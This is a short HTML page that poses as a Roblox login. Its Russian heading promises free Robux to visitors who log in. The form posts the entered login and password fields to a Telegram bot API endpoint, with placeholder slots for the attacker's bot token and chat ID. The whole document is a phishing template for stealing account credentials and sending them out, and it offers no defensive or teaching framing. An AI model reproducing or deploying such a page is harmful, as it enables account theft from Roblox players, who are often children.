<!DOCTYPE html>
<html>
<head>
    <title>Roblox</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h2>Войди, чтобы получить Robux</h2>
    <form action="https://api.telegram.org/bot<TOKEN>/sendMessage" method="POST">
        <input type="hidden" name="chat_id" value="<YOUR_CHAT_ID>">
        <input type="text" name="text" placeholder="Логин" required><br>
        <input type="password" name="password" placeholder="Пароль" required><br>
        <button type="submit">Отправить</button>
    </form>
</body>
</html>
